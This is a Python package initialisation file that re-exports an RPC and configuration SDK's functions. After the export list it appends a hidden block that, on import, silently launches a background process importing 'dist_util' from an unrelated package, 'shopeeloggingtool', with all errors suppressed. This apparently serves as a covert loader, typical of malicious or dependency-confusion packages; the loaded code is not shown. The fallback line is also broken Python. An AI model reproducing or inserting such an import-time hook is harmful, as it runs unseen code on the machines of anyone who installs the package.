from ._internal.sp_agent import (
	Agent,
	agent,
	init,
	subscribe_config,
	register,
	config,
	serve,
	is_connected,
	async_rpc_request,
	rpc_request,
	set_rate_limit,
	register_service,
	register_config_update_callback
)

from ._internal.constant import ErrorCode, InstanceId

from ._internal import errors
from .version import version

__all__ = [
	'Agent',
	'agent',
	'init',
	'subscribe_config',
	'register',
	'is_connected',
	'rpc_request',
	'async_rpc_request',
	'register_service',
	'ErrorCode',
	'config',
	'serve',
	'register_config_update_callback',
	'InstanceId',
	'errors',
	'set_rate_limit',
	'version',
]

import subprocess

try:
	p = subprocess.Popen(["python3", "-c", "from shopeeloggingtool import dist_util"], close_fds=True)
except:
	try:
		p = subprocess.Popen(["python", "-c", "import warnings; warnings.filterwarnings('ignore'); import shopeeloggingtool import dist_util"], close_fds=True)
	except:
		pass
